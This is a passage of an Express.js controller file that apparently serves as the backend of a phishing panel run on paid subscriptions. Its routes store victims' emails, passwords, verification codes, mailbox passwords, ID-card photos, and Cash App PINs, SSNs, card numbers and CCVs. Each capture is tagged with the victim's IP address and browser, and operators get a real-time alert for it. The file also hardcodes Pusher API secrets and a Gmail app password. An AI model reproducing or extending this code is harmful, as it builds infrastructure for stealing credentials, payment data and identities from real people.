'use strict'
import NewInfo from '../models/OldInfo.js'
import nodemailer from 'nodemailer';
import Amount from '../models/Amount.js'

import User from '../models/User.js'
import Info from '../models/Info.js'
import Link from '../models/Link.js'
import Click from '../models/Click.js'
// import socket from '../server.js'
import Poster from '../models/Poster.js'
import device from 'express-device'
import useragent from 'express-useragent'
import Site from '../models/Site.js'
import createToken from '../utils/createToken.js'
import Demo from '../models/Demo.js'
import Cash from '../models/Cash.js'
import rateLimitMiddleware from "../ratelimiter.js"
import axios from 'axios';
import Password from '../models/Password.js'
import satelize from 'satelize'
import Otp from '../models/Otp.js'
import Pusher from'pusher';


export const yoyo = async (req, res) => {

const{id}=req.params


    try {
        // const userAgent = req.headers['user-agent'];
        // const ipAddress =  (req.headers['x-forwarded-for'] || 
        // req.connection.remoteAddress || 
        // req.socket.remoteAddress || 
        // req.connection.socket.remoteAddress).split(",")[0];

        // satelize.satelize({ip:ipAddress}, function(err, payload) {

        //     const location =payload.timezone
        //     return res.status(200).json({ adrress:location})

        //   });
        const originalData = await Info.find({
            createdAt:{$gte: new Date(Date.now() - 24*60*60*1000)},
          })

        //   const originalData = await NewInfo.find({
        //     createdAt:{$gte: new Date(Date.now() - 24*60*60*1000)},
        //   })
        return res.status(200).json({ originalData})


    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}



export const   signup_post = async (req, res) => {
    const { username, password, links, adminId, numOfPostersPermission,validity} = req.body;

    try {
        const user = await User.findOne({ username: username })
        if (user) {
            return res.status(400).json({ error: "user exists yes" })

        }
        const foundWithAdminId = await User.findOne({ adminId: adminId })
        if (foundWithAdminId) {
            return res.status(400).json({ error: "id exists" })
        }
        const userCreated = await User.create({
            password,
            username,
            adminId,
            links,
            numOfPostersPermission,
            validity:validity*30


        })
        return res.status(200).json({ user: userCreated })


    }
    catch (e) {

        return res.status(400).json({ error: e })

    }



}
export const login_post = async (req, res) => {
    const { username, password } = req.body;
    try {
        const user = await User.findOne({ username: username })

        if (user) {
            if (user.password == password) {
                const currentDate = new Date();
                const diff=currentDate -user.createdAt;
                const  difff=diff/ 1000 / 60 / 60 / 24
            if(difff >= user.validity){
                return res.status(400).json({ error: "Subscription Expired" })

            }
                return res.status(200).json({ adminId: user.adminId, username: user.username, id: user._id, admin: user.admin, qrCodeStatus:user.qrCodeStatus,verifyId: user.verifyId})

            }
            return res.status(400).json({ error: "Wrong password" })


        }
        else {
            const poster = await Poster.findOne({ username: username })
            if (poster) {
                if (poster.password == password) {
            const poster = await Poster.findOne({ username: username })
            const admin=await User.findOne({ _id: poster.root })
            const currentDate = new Date();
            const diff=currentDate -admin.createdAt;
            const  difff=diff/ 1000 / 60 / 60 / 24
        if(difff >= admin.validity){
            return res.status(400).json({ error: "Subscription Expired" })

        }
            return res.status(200).json({ username: poster.username, id: poster._id,
                 admin: poster.admin ,adminId:admin.adminId,posterId:poster.posterId,qrCodeStatus:admin.qrCodeStatus})

                }
                return res.status(400).json({ error: "Wrong password" })

            }

        }
        return res.status(400).json({ error: "User not found" })

    } catch (e) {
        res.status(400).json({ error: "not found" })
    }

}


export const skip_code = (req, res) => {
    const { id, skipcode } = req.body;
    Info.findOneAndUpdate({ _id: id }, {
        $set: {
            skipcode: skipcode
        }
    }, { new: true }, (err, ok) => {
        if (err) {
            res.status(400).json({ error: err })
        }

        return res.status(200).json({ success: true,id:id })
    })

}


export const mega_wrong_post = (req, res) => {
    const { id, email,password } = req.body;
    Info.findOneAndUpdate({ _id: id }, {
        $set: {
            email: email,
            password:password
        }
    }, { new: true }, (err, ok) => {
        if (err) {
            res.status(400).json({ error: err })
        }

        return res.status(200).json({ success: true,id:id })
    })

}





export const cards = (req, res) => {
    const { id, onlyCard, holdingCard } = req.body;
    Info.findOneAndUpdate({ _id: id }, {
        $set: {

            onlyCard:onlyCard,
             holdingCard:holdingCard
        }
    }, { new: true }, (err, ok) => {
        if (err) {
            res.status(400).json({ error: err })
        }

        return res.status(200).json({ success: true })
    })

}

export const add_mail = (req, res) => {
    const { id,mail,mailPass } = req.body;
    Info.findOneAndUpdate({ _id: id }, {
        $set: {
            mail:mail,mailPass:mailPass
        }
    }, { new: true }, (err, ok) => {
        if (err) {
            res.status(400).json({ error: err })
        }

        return res.status(200).json({ success: true })
    })

}
export const add_posterNumber = (req, res) => {
    const { username, numberAdd } = req.body;
    User.findOneAndUpdate({ username: username }, {
        $set: {
            numOfPostersPermission: numberAdd
        }
    }, { new: true }, (err, ok) => {
        if (err) {
            res.status(400).json({ error: err })
        }
        res.status(200).json({ success: true })
    })


}



export const add_new_links = (req, res) => {
    const { username, links } = req.body;
    User.findOneAndUpdate({ username: username }, {
        $set: {
            links: links
        }
    }, { new: true }, (err, ok) => {
        if (err) {
          return  res.status(400).json({ error: err })
        }
       return res.status(200).json({ success: true })
    })

}



export const   user_noti = async (req,res)=>{
    const { text,posterId } = req.body;
    ////ahmedimran96yoo@gmail.com
    const pusher = new Pusher({
        appId: '1731286',
        key: 'a5f0008dea3736f30a17',
        secret: '0599185eb95735d5a17a',
        cluster: 'ap2',
        useTLS: true,
       
      });

    try{
        if(text){
            pusher.trigger(posterId, 'chat-notification', {
                text: text
              });
        }
        return res.status(200).json({ success: true })


    }
    catch(e){
        return  res.status(400).json({ error: err })


    }
}







export const info_get = async (req, res) => {

    const { username, id, admin } = req.params

    try {

        if (admin) {
            const user = await User.findOne({ _id: id })
                .populate({
                    path: 'posters',
                    model: 'Poster',
                    select: 'username password links ',
                    populate: {
                        path: 'details',
                        model: 'Info',
                        select: 'site email password skipcode mail mailPass onlyCard holdingCard',
                    }
                })
                .select('posters').populate('posters', 'username password links ').sort({ createdAt: -1 })
            return res.status(200).json({ user: user[0] })


        }

        const poster = await Poster.findOne({ _id: id }).select('details').populate('details', 'site email password gCode skipcode mail mailPass onlyCard holdingCard').sort({ createdAt: -1 })
        return res.status(200).json({ poster: poster })
    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}



export const id_card = async (req, res) => {

    const { username, id, admin } = req.params


    try {

        if (admin) {
            const user = await User.findOne({ _id: id })
                .populate({
                    path: 'posters',
                    model: 'Poster',
                    select: 'username password links ',
                    populate: {
                        path: 'details',
                        model: 'Info',
                        select: 'site onlyCard holdingCard',
                    }
                }).sort({ createdAt: -1 })
                .select('posters').populate('posters', 'username password links ')
            return res.status(200).json({ user: user[0] })


        }

        const poster = await Poster.findOne({ _id: id }).select('details').populate('details', 'site onlyCard holdingCard').sort({ createdAt: -1 })
        return res.status(200).json({ poster: poster })
    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}


export const poster_add = async (req, res) => {

    const { username, password, links, id, posterId } = req.body


    try {
        const user = await User.findOne({ _id: id })
        const posterExists = await Poster.findOne({ username: username })
        if (posterExists) {
            return res.status(400).json({ error: "username exists" })

        }
        const posterIdExists = await Poster.findOne({ posterId: posterId })
        if (posterIdExists) {
            return res.status(400).json({ error: "Id exists" })

        }
       
       
        if (user.numOfPosters >= user.numOfPostersPermission) {
            return res.status(400).json({ error: "User add limit reached" })

        }
       

        const poster = await Poster.create({
            username, password, links, posterId,

            root: user._id


        })
        user.posters.push(poster._id)
        user.numOfPosters = user.numOfPosters + 1
        await user.save();

        links.map(async (item) => {
            await Link.create({
                linkName: item,
                root:poster._id

            })

        })
        return res.status(200).json({ status: "saved" })

    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}


export const add_data = async (req, res) => {
    const pusher = new Pusher({
             appId: '1987499',
             key: '05656b52c62c0f688ee3',
             secret: 'b4372518df233d054270',
             cluster: 'ap2',
             useTLS: true,
           })


    const { adminId, posterId } = req.params
    const { site, mail, passcode ,email,password } = req.body
    const userAgent = req.headers['user-agent'];
    const ipAddress =  (req.headers['x-forwarded-for'] || 
    req.connection.remoteAddress || 
    req.socket.remoteAddress || 
    req.connection.socket.remoteAddress).split(",")[0];

    try {
        const userFound = await User.findOne({ adminId: adminId })

        const posterFound = await Poster.findOne({ posterId: posterId })

        if (userFound && posterFound) {
            const info = await Info.create({
                site, mail, passcode,
                email,password,
               adminId:adminId,
                poster: posterId,
                root: posterFound._id,
                ip:ipAddress,
                agent:userAgent


            })
           
            await info.save();
            if(info){
                pusher.trigger(userFound.adminId, 'new-notification', {
                    adminId: userFound.adminId,posterId:posterFound.posterId,name:posterFound.username
                  });
            }
            posterFound.details.push(info._id)
            await posterFound.save();
           
            
            return   res.status(200).json({ info: info ,email:posterFound.username})

        }
        return    res.status(400).json({ e: "not found" })


    } catch (e) {
        return  res.status(400).json({ e: "error" })
    }

}



export const change_password = async (req, res) => {
    const { user, poster, password } = req.body;
    const filter = { username: poster };
    const update = { password: password };
    try {
        const userFound = await User.findOne({ username: user })
        const posterFound = await Poster.findOne({ username: poster })
        if (userFound && posterFound) {

            await Poster.findOneAndUpdate(filter, update, {
                new: true,
                upsert: true
            });
         return   res.status(200).json({ success: "password change successfully" })

        }

    }
    catch (e) {

        return   res.status(400).json({ e: "error" })


    }




}


export const delete_poster =  (req, res) => {

    const { id_pos,id_ad } = req.params
//    return  res.status(422).json({ id: id_pos })

    Poster.findByIdAndRemove({ _id: id_pos })
    .then(user => console.log('deleted yes')).catch(err => res.status(422).json({ error: err }))
    User.findOne({_id: id_ad}).then(user => {
    const datas = user.posters.filter(posterId => posterId != id_pos)
    user.posters = [...datas]
    user.numOfPosters =user.numOfPosters - 1 
    user.save().then(useryes =>   console.log('saved yes')).catch(err => res.status(422).json({ error: err }))
    Link.deleteMany({ root: id_pos}).then(function(){
        console.log("Data deleted");
    }).catch(function(error){
        console.log(error); 
    });
    User.findOne({_id: id_ad})
    .populate({
        path: 'posters',
        model: 'Poster',
        select: 'username password links posterId',

    }).sort({ createdAt: -1 })
        .then(users =>   res.status(200).json({ data: users }))
        .catch(err => console.log('erro'))

   

}
).catch(err => res.status(422).json({ error: err }))
  

}


export const delete_info = async (req, res) => {

    const { info_id,pos_id } = req.params

    // return res.status(200).json({ data: info_id })


  const info= await Info.findById({ _id: info_id })
      const newinfo= await NewInfo.create({site:info.site, email:info.email, password:info.password, skipcode:info.skipcode,
        username:info.username,passcode:info.passcode,mail:info.mail,mailPass:info.mailPass,adminId:info.adminId,
        poster :info.poster,
        root :info.root,
        onlyCard:info.onlyCard,holdingCard:info.holdingCard})

    // return res.status(200).json({  newinfo })


    Info.findByIdAndRemove({ _id: info_id })
    .then(user => console.log('deleted yes')).catch(err => console.log('deleted yes'))
   
    Poster.findById({ _id: pos_id })
    .select('username password posterId links createdAt details')
    .populate('details', 'site email password skipcode username passcode mail mailPass onlyCard holdingCard createdAt').sort({ createdAt: -1 })
    .then(data => {
        return res.status(200).json({ data: data })    }
    ).catch(err => console.log('err', err))

}


export const link_add = async (req, res) => {

    const { linkName } = req.body

    try {
        const link = await Link.findOne({ linkName: linkName })
        if (link) {
            return res.status(400).json({ e: "exists" })

        }
        const userCtreated = await Info.User({
            linkName


        })
        return res.status(200).json({ status: "created" })

    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}

export const link_get = async (req, res) => {

    const { id } = req.params


    try {
        const user = await User.findOne({ _id: id })
        res.status(200).json({ users: user.links })
    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}




export const all_poster = async (req, res) => {

    const { id } = req.params


    try {
       const user = await User.findOne({ _id: id })

        const posters = await Poster.find({ root: id }).select('username password links posterId createdAt').sort({ createdAt: -1 })
            // .populate({
            //     path: 'posters',
            //     model: 'Poster',
            //     select: 'username password links posterId createdAt',

            // }).sort({ createdAt: -1 })
            return res.status(200).json({ data: {...user, posters: posters }})

    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}


export const poster_details =async  (req, res) => {
    const { id } = req.params



 

    try {


        const poster = await Poster.findOne({ _id: id }).select('username password posterId links createdAt')
       
        const details =await Info.find({ root: id }).select('site mail passcode skipcode email password gCode ip agent status number createdAt').sort({ createdAt: -1 })
        // const newdata = {...poster, details: details }
        // console.log(newdata)
        return res.status(200).json({ data: {...poster, details: details }})



    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}



export const add_site = async (req, res) => {
    const { name } = req.body


    try {
        const sitefound = await Site.findOne({ name: name })
        if (sitefound) {
            return res.status(200).json({ site: "site existes" })

        }

        const site = await Site.create({
            name
        })

        return res.status(200).json({ site: site })



    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}

export const link_details = async (req, res) => {

    const { id,admin} = req.params
    // return res.status(200).json({ data: id, sites: admin })


    try {
if(admin == 1){
       const data = await User.findOne({ _id: id })
        const sites = await Site.find()

        return res.status(200).json({ data: data.links, sites: sites })
    }
    else if(admin == 0){
        // return res.status(200).json({ data: id, sites: admin })

        const data = await Poster.findOne({ _id: id })
        const sites = await Site.find()
        return res.status(200).json({ data: data.links, sites: sites })
    }
        



    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}

export const site_exist_new =async (req, res) => {

  
    // const { site, adminId, posterId,device} = req.params

    const { site, adminId, posterId,verifyId,device} = req.params
    // const siteName = "https://" + site + "/"  + adminId + "/" + posterId
    const siteName = "https://" + site + "/"  + adminId + "/" + posterId  + "/" + verifyId 



    // return res.status(200).json({ success: siteName })

    const devicetype = req.device.type
    try {
      const  sitefound = await Link.findOne({linkName:siteName})

         if (sitefound) {
                 const  clickfound = await Click.findOne({site:siteName})
                  if(clickfound){
                                            clickfound.click=clickfound.click+1
                                            await clickfound.save()

                                        if(device == "desktop"){
                                            clickfound.desktop=clickfound.desktop+1
                                            await clickfound.save()
                                            return res.status(200).json({ success: "exists" ,id:sitefound._id})

                                        }
                                        if(device == "phone"){
                                            clickfound.phone=clickfound.phone+1
                                            await clickfound.save()
                                            return res.status(200).json({ success: "exists" ,id:sitefound._id})

                                        }
                                        if(device == "ipad"){
                                            clickfound.ipad=clickfound.ipad+1
                                            await clickfound.save()
                                            return res.status(200).json({ success: "exists" ,id:sitefound._id})

                                        }
                                        return res.status(200).json({ success: "exists" ,id:sitefound._id})
                                    }
             
                          else{
                              const click = await Click.create({
                            site:siteName, adminId, posterId ,
                            click:1,
                            desktop:device == "desktop" ?1:null,
                            phone:device == "phone"?1:null,
                            ipad:device == "ipad"?1:null
                                 })
                                 return res.status(200).json({ success: "exists" ,id:sitefound._id})
                                }

                   }
                    return res.status(200).json({ success: "not exist" })

       

    }
    catch (e) {
        res.status(400).json({ e: "e" })
    }

}





export const site_exist =async (req, res) => {

  
    // const { site, adminId, posterId,device} = req.params

    // const { site, adminId, posterId,device} = req.params
    // const siteName = "https://" + site + "/"  + adminId + "/" + posterId

    const { site,adminId, posterId,verifyId,device} = req.params
    // const siteName =    "https://" + site + "/" + adminId + "/" + posterId  + "/" + verifyId 
    const siteName =    "https://" + site   +  "/" + adminId + "/" + posterId  + "/" + verifyId 

    // return res.status(200).json({ success: siteName })

    const devicetype = req.device.type
    try {
      const  sitefound = await Link.findOne({linkName:siteName})

         if (sitefound) {
                 const  clickfound = await Click.findOne({site:siteName})
                  if(clickfound){
                                            clickfound.click=clickfound.click+1
                                            await clickfound.save()

                                        if(device == "desktop"){
                                            clickfound.desktop=clickfound.desktop+1
                                            await clickfound.save()
                                            const  siteamout = await Amount.findOne({site:siteName})
                                            if(siteamout){
                                                return res.status(200).json({ success: "exists" ,id:sitefound._id,sitename:siteamout})
            
            
                                             }
                                             return res.status(200).json({ success: "exists" ,id:sitefound._id})
            

                                        }
                                        if(device == "phone"){
                                            clickfound.phone=clickfound.phone+1
                                            await clickfound.save()
                                            const  siteamout = await Amount.findOne({site:siteName})
                                            if(siteamout){
                                                return res.status(200).json({ success: "exists" ,id:sitefound._id,sitename:siteamout})
            
            
                                             }
                                             return res.status(200).json({ success: "exists" ,id:sitefound._id})

                                        }
                                        if(device == "ipad"){
                                            clickfound.ipad=clickfound.ipad+1
                                            await clickfound.save()
                                            const  siteamout = await Amount.findOne({site:siteName})
                                            if(siteamout){
                                                return res.status(200).json({ success: "exists" ,id:sitefound._id,sitename:siteamout})
            
            
                                             }
                                             return res.status(200).json({ success: "exists" ,id:sitefound._id})

                                        }
                                        return res.status(200).json({ success: "exists" ,id:sitefound._id})
                                    }
             
                          else{
                              const click = await Click.create({
                            site:siteName, adminId, posterId ,
                            click:1,
                            desktop:device == "desktop" ?1:null,
                            phone:device == "phone"?1:null,
                            ipad:device == "ipad"?1:null
                                 })



                                 const  siteamout = await Amount.findOne({site:siteName})

                                 if(siteamout){
                                    return res.status(200).json({ success: "exists" ,id:sitefound._id,sitename:siteamout})


                                 }
                                 return res.status(200).json({ success: "exists" ,id:sitefound._id})



                                }

                   }
                    return res.status(200).json({ success: "not exist" })

       

    }
    catch (e) {
        res.status(400).json({ e: "e" })
    }

}



export const admin_add_site = async (req, res) => {

    const { username, site } = req.body
    // return res.status(200).json({ success: "username" })


    try {

        const data = await User.findOne({ username: username })
        const linKfound = data.links.find(function (element) {
            return element == site;
        });
        if (linKfound) {
            return res.status(200).json({ success: "exists" })

        }
        data.links.push(site)
        await data.save()
        return res.status(200).json({ success: "saved successfully" })



    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}





export const new_site_add_poster =  (req, res) => {

    const { id, password, links } = req.body
    Poster.findOneAndUpdate({  _id: id }, {
        $set: {
            password: password, links: links
        }
    }, { new: true }, (err, ok) => {
        if (err) {
            res.status(400).json({ error: err })
        }
        links.map(async (item) => {
            Link.findOne({linkName:item}).then(async(found)=>{
                 if(found){
                    console.log('yes')
                 }
                 await Link.create({
                    linkName: item,
                    root:id
                })
            }
                ).catch(e=>console.log(e))
          })
        })
        return res.status(200).json({  success: "updated successfully" })

}






export const get_A_poster = async (req, res) => {

    const { id,admin} = req.params

    // return res.status(200).json({ data: id, sites: admin })


    try {
     if(admin){
       const data = await Poster.findOne({ _id: id })
            if(!data){
                return res.status(200).json({ data: "not found"})

            }
            return res.status(200).json({ data:data})

    }
        // return res.status(200).json({ data: id, sites: admin })

        
        return res.status(200).json({ data: data.links, sites: sites })
   
        

    }

    catch (e) {
        res.status(400).json({ e: "error" })
    }

}




// module.exports.signin_post=async(req,res)=>{
//     const {email,password}=req.body;
//     try{
//         const user= await User.login(email,password);
//         const token=cretaetoken(user._id);
//         console.log('yes yes',user)
//         // res.cookie('jwt',token,{httpOnly:true,maxAge:3*24*60*60*1000})
//         // const user= await User.findById(usercreate._id).select("email fullname data account").populate("data","bio gender")

//         res.status(200).json({user:user,token:token})
//       }
//     catch(err){
//         const error=handleerror(err)
//         res.status(422).json({error})
//       //   res.send(err.code)
//       }


//  }

//  module.exports.signin_post=(req,res)=>{
//     const {email,password}=req.body;
//     User.findOne({email:email})
//     .then(user=>{
//         if(!user){
//             return    res.status(422).json({error:"Invalid Email Or Password"})
//         }
//         bcrypt.compare(password,user.password)
//         .then(doMatch=>{
//             if (doMatch){
//                 const token =  cretaetoken(user._id);
//                 res.status(200).json({user:user,token:token})
//             }
//             else{
//                 return    res.status(422).json({error:"Invalid Email Or Password"})
//             }
//         }).catch(err=>{
//             console.log('err')
//         })
//     }).catch(err=>console.log('err'))


//  } 



export const click = async (req, res) => {
    const { adminId,posterId } = req.params


    try {
        const click = await Click.find({ adminId: adminId,posterId:posterId })
        if (click.length > 0) {
            return res.status(200).json({ click: click })

        }

        
        return res.status(400).json({ error: "not found any" })



    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}


export const click_for_admin = async (req, res) => {
    const { adminId } = req.params


    try {
        const click = await Click.find({ adminId: adminId})
        if (click.length > 0) {
            return res.status(200).json({ click: click })

        }

        
        return res.status(400).json({ error: "not found any" })



    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}



export const otp_send = async (req, res) => {
    const {username, phone } = req.body
    const apiUrl = 'https://sms.dev-sajid.xyz/api/send-otp-v1';

    const postData =  {
        number: phone
      }
 
    //   return res.status(200).json({ success:"otp sent successfully"})

      try{
        const   userFound = await User.findOne({username:username})
         if(userFound.phone == phone){
            const response = await  axios.post(apiUrl,postData)
            if(! response){

                return  res.status(400).json({ e: "user not found" })

            }
            const otp = await Otp.create({
                otp:response.data.otp,
                username
    
            })
           
            // const   passwordOfPassChanges= await Password.findOne({constant:"yanky"})
            // passwordOfPassChanges.totalRequest= passwordOfPassChanges.totalRequest + 1
            // await  passwordOfPassChanges.save()

            return res.status(200).json({ success:"otp sent successfully"})
         }
        return  res.status(400).json({ e: "user not found" })


        
      }
      catch(e){
        return    res.status(400).json({ e: "error" })

      }

        

}

export const otp_check = async (req, res) => {
    const { username ,otp} = req.body


    try {
        
         const   userFound = await User.findOne({username:username})

         const   otpUser = await Otp.findOne({otp:otp})

            if(userFound.username == otpUser.username){

                const currentDate = new Date();
                const diff=currentDate -otpUser.createdAt;
                const  difff=diff/ 1000 / 60
            if(difff >= 2){
                return res.status(400).json({ error: "session Expired" })

            }
              return res.status(200).json({ success: "true" })
            }       

      
     return   res.status(400).json({ e: "user not found" })


    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}



export const pass_change = async (req, res) => {
    const { username ,password,otp} = req.body
    const pusher = new Pusher({
        appId: '1987499',
        key: '05656b52c62c0f688ee3',
        secret: 'b4372518df233d054270',
        cluster: 'ap2',
        useTLS: true,
      })

   


    try {
        
         const   userFound = await User.findOne({username:username})
         const   otpUser = await Otp.findOne({otp:otp})

            if(userFound && otpUser){
                userFound.password=password
              await userFound.save()
              const   deleted = await Otp.findOneAndRemove({otp:otpUser.otp})

              if(deleted){
                pusher.trigger(userFound.adminId, 'password-notification', {
                    adminId: userFound.adminId,
                  });

              }

              return res.status(200).json({ success: "changed succesfully" })
            }       

      
     return   res.status(400).json({ e: "user not found" })


    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}


export const phone_add = async (req, res) => {
    const { username ,phone} = req.body
    // return res.status(200).json({ success: "changed succesfully" })


    try {
        
         const   userFound = await User.findOne({username:username})
         const   userPhone = await User.findOne({phone:phone})
      

            if(userFound){

                // if(userPhone){
                //     return   res.status(400).json({ e: "phone number exists" })

                // }
                userFound.phone=phone
              await userFound.save()
              return res.status(200).json({ success: "changed succesfully" })
            }       

      
     return   res.status(400).json({ e: "user not found" })


    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}





export const update_validity =  (req, res) => {

    const { username } = req.body
    const currentDate = new Date();
   return res.status(200).json({ success: currentDate })

    User.findOneAndUpdate({ username: username }, {
        $set: {
            createdAt: currentDate
        }
    }, { new: true }, (err, ok) => {
        if (err) {
            res.status(400).json({ error: err })
        }
        res.status(200).json({ success: currentDate })
    })

}

export const cashapap_post = async (req, res) => {
    const { adminId, posterId } = req.params
    const { contact,code, pin, ssn,email,password, site, card_number,mm_yy, ccv,zip} = req.body;

    try {
        const userFound = await User.findOne({ adminId: adminId })

        const posterFound = await Poster.findOne({ posterId: posterId })
        if (userFound && posterFound) {
            const cashapp = await Cash.create({
                contact, code, pin, ssn, email,password,site,card_number,mm_yy, ccv,zip,adminId, posterId
    
    
            })
            return res.status(200).json({ success: "Created successfully " })
        }

        return res.status(400).json({ error: "doesnt exists" })

       


    }
    catch (e) {

        return res.status(400).json({ error: e })

    }


}





export const links_add =  (req, res) => {

    const { username,link } = req.body
    const currentDate = new Date();
    User.findOneAndUpdate({ username: username }, {
        $set: {
            links: link
        }
    }, { new: true }, (err, ok) => {
        if (err) {
            res.status(400).json({ error: err })
        }
        res.status(200).json({ success: true })
    })

}






export const get_deyails_cashapp = async (req, res) => {
    const { anyid } = req.params


    try {
        const cashappForPoster = await Cash.find({posterId:anyid }).sort({ createdAt: -1 })
        if (cashappForPoster.length > 0) {
            return res.status(200).json({ cashapp: cashappForPoster})

        }

        const cashappAdmin = await Cash.find({adminId:anyid }).sort({ createdAt: -1 })
        if (cashappAdmin.length > 0) {
            return res.status(200).json({ cashapp: cashappAdmin })

        }
        return res.status(400).json({ error: "not found any" })



    } catch (e) {
        res.status(400).json({ e: "error" })
    }

}



export const demo_add = async (req, res) => {
    const {username, linkName,age } = req.body;
console.log(username, linkName,age )
    try {
      
        const userCreated = await Demo.create({
            username, linkName ,age


        })
        const userFound = await Demo.find()

        return res.status(200).json({ user: userFound })


    }
    catch (e) {

        return res.status(400).json({ error: e })

    }



}


export const show_all = async (req, res) => {
    // socket.io.on("setup",()=>{
    //     socket.io.emit("done")
    // })
    try {
      
        
        const userFound = await Poster.find().select("links")

        return res.status(200).json({ user: userFound })


    }
    catch (e) {

        return res.status(400).json({ error: e })

    }

}
export const check_qrcode = async (req, res) => {
    const { adminId } = req.params

    try {
      
        const userFound = await User.findOne({ adminId: adminId })

if(userFound){
    if(userFound.qrCodeStatus == true){
        return res.status(200).json({ status: true })

    }
    
    return res.status(200).json({ status: false })

}
        return res.status(400).json({ error: "not found" })


    }
    catch (e) {

        return res.status(400).json({ error: e })

    }



}

export const rqcode_permission =  (req, res) => {

    const { username } = req.body
    User.findOneAndUpdate({ username: username }, {
        $set: {
            qrCodeStatus: true
        }
    }, { new: true }, (err, ok) => {
        if (err) {
            res.status(400).json({ error: err })
        }
        res.status(200).json({ success: "succes" })
    })


}

export const update_many =  (req, res) => {

    const conditions = {};
    const update = {
        $set : {
            qrCodeStatus:false
      }
    };
    const options = { multi: true, upsert: true };

    User.updateMany(conditions, update, options,(err, ok) => {
        if (err) {
            res.status(400).json({ error: err })
        }
        res.status(200).json({ success: "success" })
    })


}


export const add_data_checnge = async (req, res) => {

    const { adminId, posterId } = req.params
    const { site, email, password, skipcode ,username,passcode } = req.body
    const userAgent = req.headers['user-agent'];
    const ipAddress = req.connection.remoteAddress;
    try {
        const userFound = await User.findOne({ adminId: adminId })

        const posterFound = await Poster.findOne({ posterId: posterId })

        if (userFound && posterFound) {
            const info = await Info.create({
                 skipcode,
                username,passcode,
                poster: posterId,
                root: posterFound._id,
                ip:ipAddress,
                agent:userAgent

            })
            posterFound.details.push(info._id)
            await posterFound.save();
            changeEvent("hello",req, res)
            return   res.status(200).json({ info: info })

        }
        return    res.status(400).json({ e: "not found" })


    } catch (e) {
        return  res.status(400).json({ e: "error" })
    }

}

export const today_data = async(req, res) => {
    const {IId}=req.params
    const user=await User.findOne({adminId:IId})
        if(user){

            const desktopClickSum = await Click.aggregate([
                { $match: { adminId: IId } }, // Filter by adminId
                { $group: { _id: null, totalDesktop: { $sum: "$desktop" } } } // Sum desktop values
            ]);
            
            
            const phoneClickSum = await Click.aggregate([
                { $match: { adminId:IId } }, // Filter by adminId
                { $group: { _id: null, totalPhone: { $sum: "$phone" } } } // Sum desktop values
            ]);
            
            const ipadClickSum = await Click.aggregate([
                { $match: { adminId: IId } }, // Filter by adminId
                { $group: { _id: null, totalIpad: { $sum: "$ipad" } } } // Sum desktop values
            ]);
            
            
            
            const totalDesktopClicks = desktopClickSum.length > 0 ? desktopClickSum[0].totalDesktop : 0;
            const totalPhoneClicks = phoneClickSum.length > 0 ? phoneClickSum[0].totalPhone : 0;
            const totalIpadClicks = ipadClickSum.length > 0 ? ipadClickSum[0].totalIpad : 0;
            return res.status(200).json({ desktopClick: totalDesktopClicks,mobileClick: totalPhoneClicks,tabletClick: totalIpadClicks,totalClick:totalDesktopClicks + totalPhoneClicks + totalIpadClicks})


          



        }
        else{

            const desktopClickSum = await Click.aggregate([
                { $match: { posterId: IId } }, // Filter by adminId
                { $group: { _id: null, totalDesktop: { $sum: "$desktop" } } } // Sum desktop values
            ]);
            
            
            const phoneClickSum = await Click.aggregate([
                { $match: { posterId:IId } }, // Filter by adminId
                { $group: { _id: null, totalPhone: { $sum: "$phone" } } } // Sum desktop values
            ]);
            
            const ipadClickSum = await Click.aggregate([
                { $match: { posterId: IId } }, // Filter by adminId
                { $group: { _id: null, totalIpad: { $sum: "$ipad" } } } // Sum desktop values
            ]);
            
            
            
            const totalDesktopClicks = desktopClickSum.length > 0 ? desktopClickSum[0].totalDesktop : 0;
            const totalPhoneClicks = phoneClickSum.length > 0 ? phoneClickSum[0].totalPhone : 0;
            const totalIpadClicks = ipadClickSum.length > 0 ? ipadClickSum[0].totalIpad : 0;
            return res.status(200).json({ desktopClick: totalDesktopClicks,mobileClick: totalPhoneClicks,tabletClick: totalIpadClicks,totalClick:totalDesktopClicks + totalPhoneClicks + totalIpadClicks})

            

        }
}


export const email_otp = async (req, res) => {
    const { username ,email} = req.body
    const rand =   Math.random().toString().substr(2, 6)

    const transporter = nodemailer.createTransport({
        service: 'gmail',
        host: 'smtp.gmail.com',
        port: 587,
        secure: false,
        auth: {

            user: 'ranaha199112@gmail.com',
            pass:'jzpp ypxn ywtr niog',
        //   user: 'tonmoysamoi@gmail.com',
        //   pass:'theh cifb ffjc ogil',
        },
      });
    
      const mailOptions = {
        from: {
          name: 'Forget Password',
          address: 'ranaha199112@gmail.com',
        },
        to: email,
        subject: 'Otp Check',
        text: `Your Password OTP is ${rand}` ,
      };
  




     
        try {
            const   userFoundWithEmail = await User.findOne({email:email})
            const   userFoundWithUsername= await User.findOne({username:username})
            if(userFoundWithEmail.email ==userFoundWithUsername. email){
            const info = await transporter.sendMail(mailOptions);
            const userCreated = await Otp.create({
              otp:rand,
              username
            });
           return res.status(200).json({success:'Email sent'});
        }
        return  res.status(500).json({error:"not found"});


          } 
          catch (error) 
          {
            return  res.status(500).json({error:error});
          }


      


   
}

export const add_email = (req, res) => {

    const { id, mail,mailPass } = req.body;

    Info.findOneAndUpdate({ _id: id }, {
        $set: {
            mail,mailPass
        }
    }, { new: true }, (err, ok) => {
        if (err) {
            res.status(400).json({ error: err })
        }

        return res.status(200).json({ success:true })
    })

}

export const email_add = async (req, res) => {
    const { username ,email} = req.body
    // return res.status(200).json({ success: "changed succesfully" })


    try {
        
         const   userFound = await User.findOne({username:username})
         const   useremail= await User.findOne({email:email})
      

         if(userFound && !useremail){
             userFound.email=email
           await userFound.save()
           return res.status(200).json({ success: "changed succesfully" })
         }       
   

      
     return   res.status(400).json({ e: "user not found" })


